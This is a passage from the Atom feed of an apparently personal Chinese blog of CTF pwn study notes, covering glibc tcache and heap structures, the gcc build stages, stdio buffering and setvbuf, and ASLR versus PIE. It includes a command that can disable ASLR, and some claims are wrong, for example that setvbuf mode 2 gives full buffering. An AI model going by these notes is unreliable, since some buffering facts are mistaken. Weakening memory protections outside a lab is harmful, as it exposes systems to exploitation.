强制转换成 tcache_entry </em> 类型，e指针也就指向了mem,然后修改mem的头字段(现在被视为entery的next指针)为之前的该entery的第一个chunk,然后再把entery的值改为e指针,最后把 tcache-&gt;counts[tc_idx] 加 1 ，表示新增了一个 chunk 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>简单来说就是put的逆操作,不多说.</p><p><strong>得到tc_idx的宏定义</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br></pre></td></tr></table></figure><h2 id="基本工作"><a href="#基本工作" class="headerlink" title="基本工作"></a>基本工作</h2><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <strong>tcache_perthread_struct</strong> 。</li><li>单链表tcache_entry，也即tcache Bin的默认最大数量是<strong>64</strong>，在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是0x20-0x410，也就是说我们必须要malloc size≤0x408的chunk</li><li><p>free 内存，且 size 小于 small bin size 时</p><ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）（<strong>p位不置零故不合并</strong>）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li><p>先从 tcache 取 chunk，直到 tcache 为空</p></li><li><p>tcache 为空后，从 bin 中找</p></li><li><p>tcache 为空时，如果 <strong>fastbin/smallbin/unsorted bin</strong>中有 size 符合的 chunk，会先把 <strong>fastbin/smallbin/unsorted bin</strong> 中的其他chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</p></li><li>上一条第三点详细说<ul><li>如果从 fastbin 中成功返回了一个需要的 chunk，那么对应 fastbin 中的其他 chunk 会被放进相应的 tcache bin 中，直到上限。需要注意的是 chunks 在 tcache bin 的顺序和在 fastbin 中的顺序是反过来的。</li><li>smallbin 中的情况与 fastbin 相似，双链表中的剩余 chunk 会被填充到 tcache bin 中，直到上限。</li><li>binning code（chunk合并等其他情况）中，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。寻找结束后，tcache 会返回其中一个。</li></ul></li></ul><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>这篇文章较上一篇更多东西是缝上去的,归纳整理的成分更多,自己总结的少一点。</p>]]></content>
    
    
    <summary type="html">更深入一点点</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>基础杂烩</title>
    <link href="https://ixout.github.io/posts/32771/"/>
    <id>https://ixout.github.io/posts/32771/</id>
    <published>2023-03-18T07:16:02.000Z</published>
    <updated>2023-04-03T15:18:35.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习过程中发现自己对一些计算机系统的基础知识并不了解，目前暂时也没有精力去系统的学习，于是就将经常遇到的又不懂的知识归纳一下</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="虚拟地址与物理地址之间的映射"><a href="#虚拟地址与物理地址之间的映射" class="headerlink" title="虚拟地址与物理地址之间的映射"></a>虚拟地址与物理地址之间的映射</h2><p>先看一下进程虚拟地址空间的总体布局，以32位Linux系统为例：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_152459.png" alt=""></p><p>基于上图的虚拟地址空间布局来简单说下ELF文件是怎样映射到进程虚拟地址空间的，ELF文件被组织成如下图左列出的一系列section，其中具有相同属性（R/W/E）的section再组成一个segment，以segment为单位映射到进程的虚拟地址空间，其中虚拟地址空间中的segment要做到页大小对齐，下图也一同简要展示了虚拟地址空间到物理地址空间的映射，通过MMU完成。</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_152545.png" alt=""></p><p>其它系统原理类似，都是将可执行程序组织成若干segment连同用到的动态库和kernel映射到进程的虚拟地址空间，主要差别在于不同segment映射的起始地址、大小不同等，比如32位Linux系统的Text segment起址是0x08048000，64位Linux系统的Text segment起址是0x00400000，再比如相对32位Linux系统的kernel space是1G，32位Windows的kernel space是2G等等。</p><h2 id="main函数参数"><a href="#main函数参数" class="headerlink" title="main函数参数"></a>main函数参数</h2><p>学c语言时有没有学过忘了，反正我不会，了解一下</p><ul><li><p>int argc：这个东西是所有参数的个数，包括文件名</p></li><li><p>char* argv[]：这个东西里面，argv[]是argc个参数，其中第0个参数即argv[0]是程序的全名，后面跟着的就是用户输入的参数了</p></li><li>char* envp[]：这个东西用来取得系统的环境变量，envp保存了系统所有的环境变量路径</li></ul><h2 id="从源代码到可执行文件"><a href="#从源代码到可执行文件" class="headerlink" title="从源代码到可执行文件"></a>从源代码到可执行文件</h2><p>过程可分为4个步骤：预处理（Preprocessing）、编译（Compilation）、汇编（Assembly）和链接（Linking）。</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_110757.png" alt=""></p><p>以hello word 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">&quot;hello.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">printf</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__restrict __format, ...)</span>;</span><br><span class="line">......</span><br><span class="line">main() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预编译过程主要处理源代码中以 “#” 开始的预编译指令：</p><ul><li>将所有的 “#define” 删除，并且展开所有的宏定义。</li><li>处理所有条件预编译指令，如 “#if”、“#ifdef”、“#elif”、“#else”、“#endif”。</li><li>处理 “#include” 预编译指令，将被包含的文件插入到该预编译指令的位置。注意，该过程递归执行。</li><li>删除所有注释。</li><li>添加行号和文件名标号。</li><li>保留所有的 #pragma 编译器指令。</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">        .file   &quot;hello.c&quot;</span><br><span class="line">        .section        .rodata</span><br><span class="line">.LC0:</span><br><span class="line">        .string &quot;hello, world&quot;</span><br><span class="line">        .text</span><br><span class="line">        .globl  main</span><br><span class="line">        .type   main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset 6, -16</span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register 6</span><br><span class="line">        leaq    .LC0(%rip), %rdi</span><br><span class="line">        call    puts@PLT</span><br><span class="line">        movl    $0, %eax</span><br><span class="line">        popq    %rbp</span><br><span class="line">        .cfi_def_cfa 7, 8</span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">        .size   main, .-main</span><br><span class="line">        .ident  &quot;GCC: (GNU) 7.2.0&quot;</span><br><span class="line">        .section        .note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><p>编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生成相应的汇编代码文件。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c hello.s -o hello.o</span><br><span class="line">或者</span><br><span class="line">$gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -sd hello.o</span><br><span class="line"></span><br><span class="line">hello.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 554889e5 488d3d00 000000e8 00000000  UH..H.=.........</span><br><span class="line"> 0010 b8000000 005dc3                      .....].</span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 68656c6c 6f2c2077 6f726c64 00        hello, world.</span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202847 4e552920 372e322e  .GCC: (GNU) 7.2.</span><br><span class="line"> 0010 3000                                 0.</span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span><br><span class="line"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 17000000 00410e10 8602430d  .........A....C.</span><br><span class="line"> 0030 06520c07 08000000                    .R......</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:   55                      push   %rbp</span><br><span class="line">   1:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">   4:   48 8d 3d 00 00 00 00    lea    0x0(%rip),%rdi        # b &lt;main+0xb&gt;</span><br><span class="line">   b:   e8 00 00 00 00          callq  10 &lt;main+0x10&gt;</span><br><span class="line">  10:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  15:   5d                      pop    %rbp</span><br><span class="line">  16:   c3                      retq</span><br></pre></td></tr></table></figure><p>汇编器将汇编代码转变成机器可以执行的指令。</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -j .text hello</span><br><span class="line">......</span><br><span class="line">000000000000064a &lt;main&gt;:</span><br><span class="line"> 64a:   55                      push   %rbp</span><br><span class="line"> 64b:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line"> 64e:   48 8d 3d 9f 00 00 00    lea    0x9f(%rip),%rdi        # 6f4 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line"> 655:   e8 d6 fe ff ff          callq  530 &lt;puts@plt&gt;</span><br><span class="line"> 65a:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 65f:   5d                      pop    %rbp</span><br><span class="line"> 660:   c3                      retq</span><br><span class="line"> 661:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line"> 668:   00 00 00</span><br><span class="line"> 66b:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>目标文件需要链接一大堆文件才能得到最终的可执行文件（上面只展示了链接后的 main 函数，可以和 hello.o 中的 main 函数作对比）。链接过程主要包括地址和空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定向（Relocation）等。</p><h2 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h2><h3 id="缓冲区是啥"><a href="#缓冲区是啥" class="headerlink" title="缓冲区是啥"></a>缓冲区是啥</h3><p>缓冲区是计算机中用于存储数据的一段内存区域，它可以用于临时存储输入或输出的数据，以提高计算机的性能。<strong>在输入/输出操作中，缓冲区通常用于临时存储待读取或待写入的数据</strong>。</p><p>在标准C库中，对于文件流，缓冲区是由库管理的一个内存区域，用于存储读写数据时的临时数据。<strong>输入缓冲区用于缓存从文件中读取的数据，输出缓冲区用于缓存将要写入文件的数据</strong>。缓冲区的作用是将多个小数据块合并成一个大数据块进行读写，从而提高输入输出效率。</p><p>缓冲区的大小通常是可配置的，并且可以根据实际需求进行调整。较小的缓冲区可以提高输入输出的实时性，但可能会导致读写速度较慢。较大的缓冲区可以提高输入输出的速度，但会消耗更多的内存空间。因此，在实际应用中，需要根据具体场景和需求来选择合适的缓冲区大小。</p><h3 id="输出流与输入流和错误流"><a href="#输出流与输入流和错误流" class="headerlink" title="输出流与输入流和错误流"></a>输出流与输入流和错误流</h3><p><strong>输入流</strong>通常与输入设备相对应，例如键盘、鼠标、触摸屏等。程序可以从输入流中读取数据，以便对数据进行处理和分析。在 C 语言中，标准输入流 stdin 就是一种输入流，程序可以使用各种输入函数（如 scanf() 或 fgets()）从 stdin 中读取数据。</p><p><strong>输出流</strong>通常与输出设备相对应，例如显示器、打印机、文件等。程序可以使用各种输出函数（如 printf() 或 fputs()）将数据输出到输出流中，以便展示给用户或保存到文件中。在 C 语言中，标准输出流 stdout 就是一种输出流，程序可以使用各种输出函数向 stdout 中输出数据。</p><p>除了标准输入流 stdin 和标准输出流 stdout，C 语言还提供了一个<strong>标准错误流 stderr</strong>。与标准输入流和标准输出流类似，标准错误流也是一种数据流，用于向程序开发者或用户报告错误和异常情况。在 C 语言中，标准错误流 stderr 与标准输出流 stdout 类似，也是一种输出流，可以使用各种输出函数将错误信息输出到 stderr 中。与标准输出流不同的是，标准错误流通常不会被缓冲，这意味着当错误信息输出到 stderr 时，它会立即显示在屏幕上或被写入到文件中，以便及时发现和处理错误。</p><h3 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h3><p>setbuf 是一个标准C库函数，用于设置标准I/O库的缓冲区。它的原型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void setbuf(FILE *restrict stream, char *restrict buf);</span><br></pre></td></tr></table></figure><p>其中，stream 是一个指向 FILE 结构体的指针，用于标识要设置缓冲区的流；buf 是一个指向 char 类型的数组，用于指定缓冲区的地址。<strong>如果 buf 是 NULL，那么会禁用缓冲，相当于将流设置为无缓冲模式</strong>。</p><p>setbuf 函数的作用是设置流的缓冲区，以及决定流的缓冲模式（有缓冲或无缓冲）。有缓冲模式下，每次输出操作（如 fprintf、fputs、fwrite 等）将数据写入到缓冲区，直到缓冲区满了或者遇到了一个换行符（’\n’）才会将缓冲区中的数据一次性地写入到磁盘上的文件。无缓冲模式下，每次输出操作都会直接写入到磁盘上的文件中。</p><p>使用 setbuf 函数可以在打开文件之后立即设置流的缓冲区，这比使用 setvbuf 函数要简单，但是 setbuf 函数不支持自定义缓冲区大小和缓冲模式的设置。</p><h3 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h3><p>setvbuf和setbuf类似</p><p>setvbuf 函数原型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cCopy code</span><br><span class="line">int setvbuf(FILE *restrict stream, char *restrict buf, int mode, size_t size);</span><br></pre></td></tr></table></figure><p>其中，stream 是一个指向 FILE 结构体的指针，用于标识要设置缓冲区的流；buf 是一个指向 char 类型的数组，用于指定缓冲区的地址；mode 是一个整数值，用于指定缓冲区的类型，可以为以下三种类型之一：</p><ul><li>_IONBF：无缓冲区类型。</li><li>_IOLBF：行缓冲区类型，遇到换行符时自动刷新缓冲区。</li><li>_IOFBF：全缓冲区类型，缓冲区满时自动刷新缓冲区。</li></ul><p>size 参数用于指定缓冲区的大小，如果缓冲区为全缓冲类型，则 size 表示缓冲区的大小，如果为行缓冲类型，则 size 应该为 0。0不是空,而是合适大小.</p><h3 id="缓冲区刷新"><a href="#缓冲区刷新" class="headerlink" title="缓冲区刷新"></a>缓冲区刷新</h3><p>当缓冲区满时(或行缓冲遇到\n)，会触发缓冲区刷新操作，即将缓冲区内的数据发送到相应的文件或设备中。具体来说，缓冲区满的情况下有两种触发缓冲区刷新的方式：</p><ol><li>缓冲区填满(或行缓冲遇到\n)：当缓冲区已满并且程序试图向其写入更多数据时，会自动触发缓冲区刷新操作，将缓冲区内的数据发送到相应的文件或设备中，以便为新的数据腾出空间。</li><li>强制刷新：程序可以通过调用 fflush 函数强制刷新缓冲区，即将缓冲区内的数据立即发送到相应的文件或设备中，而不必等待缓冲区填满。</li></ol><p>需要注意的是，<strong><u>在默认情况下</u></strong>，缓冲区在以下情况下会自动刷新：</p><ol><li><strong>当程序正常退出时。</strong></li><li><u><strong>当程序调用 exit 函数时。</strong></u></li><li><strong>当程序向标准错误流（stderr）输出数据时。</strong></li></ol><h3 id="常见形式与功能"><a href="#常见形式与功能" class="headerlink" title="常见形式与功能"></a>常见形式与功能</h3><p>经常能在做题时看见</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li><code>setvbuf(stdout, 0, 2, 0);</code> 表示将标准输出流 stdout 设置为全缓冲模式，并且缓冲区大小为默认大小。</li><li><code>setvbuf(stdin, 0, 1, 0);</code> 表示将标准输入流 stdin 设置为行缓冲模式，并且缓冲区大小为默认大小。</li><li><code>setvbuf(stderr, 0, 1, 0);</code> 表示将标准错误流 stderr 设置为行缓冲模式，并且缓冲区大小为默认大小。</li></ul><p>或者</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>)</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>)</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>setbuf函数被用来禁用了标准输入、标准输出和标准错误流的缓冲区，将其设置为无缓冲模式。</p><p>在无缓冲模式下，每次从流中读取或写入的数据都会直接传输到底层设备，而不会先缓存在流的缓冲区中。文件与设备是直接交互的，中间没有缓冲区。</p><h3 id="若无setbuf与setvbuf"><a href="#若无setbuf与setvbuf" class="headerlink" title="若无setbuf与setvbuf"></a>若无setbuf与setvbuf</h3><p>在标准C中，<strong><u><em>默认情况下</em></u></strong>，<strong>标准输入和标准错误流是不缓冲的</strong>，也就是说，每次读取或写入<u>一个字符</u>时都会立即与底层设备进行交互。而<strong>标准输出流默认是<u>行缓冲</u>的</strong>，也就是说，每当输出一个<u>换行符</u>或者缓冲区被<u>填满</u>时，才会将缓冲区中的数据输出到屏幕上。</p><p>这也就是为什么一些题目,按照源码明明该有输出,但管道却阻塞无输出的原因</p><p><strong><u>此外若程序在无setbuf与setvbuf的情况下,要想获得其最终结果输出就需要使得程序正常退出(exit)</u></strong></p><p>因为此时输出结果是先缓存在服务器本地的。</p><p>另外，程序<u>本身没有setbuf操作的话</u>，<strong>在第一次执行io操作时会在堆中申请缓冲区(1024?)</strong>。</p><p>上面所述有一些问题，具体与编译器版本有一定关系</p><h2 id="linux程序执行流程"><a href="#linux程序执行流程" class="headerlink" title="linux程序执行流程"></a>linux程序执行流程</h2><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/hZ3KjroJWDPQBcl.png" alt=""></p><h2 id="常见c库函数"><a href="#常见c库函数" class="headerlink" title="常见c库函数"></a>常见c库函数</h2><p>一些用的不多的c库函数,有些陌生,归纳记录一下</p><h3 id="fgets"><a href="#fgets" class="headerlink" title="fgets"></a>fgets</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">int</span> n, FILE *<span class="keyword">restrict</span> stream)</span>`;</span><br></pre></td></tr></table></figure><p>从流stream中读取n个字符并写入s字符串中</p><h3 id="isoc99-sscanf"><a href="#isoc99-sscanf" class="headerlink" title="__isoc99_sscanf"></a>__isoc99_sscanf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __isoc99_sscanf(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...);</span><br></pre></td></tr></table></figure><p>从字符串s中按格式化字符串format写到指定位置</p><h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>其中，参数含义如下：</p><ul><li><code>ptr</code>：指向读取数据存储位置的指针；</li><li><code>size</code>：每个数据块的字节数；</li><li><code>count</code>：数据块的个数；</li><li><code>stream</code>：文件指针，指向要读取的文件。</li><li>函数返回值为实际读取的数据块数目，如果发生错误或者已经到达文件结尾，则返回值可能小于 <code>count</code>。</li></ul><h3 id="strtol"><a href="#strtol" class="headerlink" title="strtol"></a>strtol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *nptr, <span class="type">char</span> **endptr, <span class="type">int</span> base)</span></span><br></pre></td></tr></table></figure><p>其中，参数含义如下：</p><ul><li><code>nptr</code>：要转换的字符串指针；</li><li><code>endptr</code>：可选输出参数，指向转换停止处的下一个字符的指针，如果该指针为 NULL，则不会返回该值；</li><li><code>base</code>：进制数，可以是 2 ~ 36 之间的任意值，或者特殊值 0，表示根据 <code>nptr</code> 的前缀来确定进制数（”0x” 或 “0X” 表示 16 进制，”0” 表示 8 进制，否则默认为 10 进制）。</li></ul><p>函数返回值为转换后的长整型数值。如果转换失败，返回值为 0，同时设置 <code>endptr</code> 为 <code>nptr</code>，并将 <code>errno</code> 设置为 <code>EINVAL</code> 或 <code>ERANGE</code>。</p><p>需要注意的是，由于 <code>strtol</code> 函数不支持无符号长整型，因此如果需要将字符串转换为无符号长整型，可以使用 <code>strtoul</code> 函数。</p><p>且strtol只能转换数字组成的字符串</p><h2 id="ASLR与PIE"><a href="#ASLR与PIE" class="headerlink" title="ASLR与PIE"></a>ASLR与PIE</h2><p>总是混淆分不清,整理一下</p><div class="table-container"><table><thead><tr><th></th><th>作用位置</th><th>归属</th><th>作用时间</th></tr></thead><tbody><tr><td>ASLR</td><td>0:不开启<br/>1：栈基地址（stack）、共享库（.so\libraries）、mmap 基地址<br/>2：在 1 基础上，增加随机化堆基地址（chunk）</td><td>系统功能</td><td>作用于程序（ELF）装入内存运行时</td></tr><tr><td>PIE</td><td>代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）</td><td>编译器功能</td><td>作用于程序（ELF）编译过程中</td></tr></tbody></table></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改ASLR设置</span><br><span class="line">echo 0/1/2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">一些十分基础的东西</summary>
    
    
    
    <category term="杂烩" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="基础" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>堆学习笔记</title>
    <link href="https://ixout.github.io/posts/8932/"/>
    <id>https://ixout.github.io/posts/8932/</id>
    <published>2023-03-02T14:31:03.000Z</published>
    <updated>2023-04-03T07:29:26.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>堆的学习可以说是一道坎了，要掌握的话对源码阅读及理解的能力要求挺高，初学时往往被搞得晕头转向，这里就记录一下我的学习记录，基础的东西到处都有就不记了，主要还是记一些我认为比较重要或者容易被忽略的细节。</p><hr><h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>基础的东西网上能搜到的教程(像ctfwiki,狼组安全,ctf-all-in-one等)讲的已经很细了，认真看一定能有一个基础的知识框架.不过还是推荐看一看华庭大佬的<a href="https://pan.baidu.com/s/167Z3CHDEeP1dl3c2Ii0lXg?pwd=1234">glibc内存管理-ptmalloc2源码分析</a>(很细很全很直白),看了之后真的能有很多收获.</p><h2 id="理清从属关系"><a href="#理清从属关系" class="headerlink" title="理清从属关系"></a>理清从属关系</h2><p>初学时,heap,arena,chunk这些东西很容易把人搞糊涂,这里简单梳理一下</p><p>系统中整个堆功能的实现区域都可以被叫做堆(heap),但其实但heap还有一个相对这个整个堆区域要更小的概念,如下:</p><p>glibc的malloc源码中涉及三种最重要数据结构：<strong>Arena、Heap、Chunk</strong> ，分别对应结构体<strong>malloc_state、heap_info、malloc_chunk 。</strong>每个数据结构都有对应的结构体实现,如图:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095156.png" alt=""></p><ul><li><strong>Thread - Arena</strong> ： 一个Arena对应多个线程Thread。即每个线程都有一个Arena，但是有可能多个线程共用一个Arena(同一时间只能一对一)。每个Arena都包含一个malloc_state结构体，保存bins, top chunk, Last reminder chunk等信息。</li><li><strong>Arena - Heap</strong>：一个Arena可能拥有多个heap。Arena开始的时候只有一个heap，但是当这个heap的空间用尽时，就需要获取新的heap。(也可以理解为subheap子堆)</li><li><strong>Heap - Chunk</strong>：一个Heap根据用户的请求会划分为多个chunk，每个chunk拥有自己的header - malloc_chunk。</li></ul><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161600.png" alt=""></p><p>需要注意的是，<em>Main Arena只有一个heap，因此没有heap_info结构</em>。当main arena用尽空间后，会扩展当前的heap空间。此外，Main Arean的Arena header并不是heap 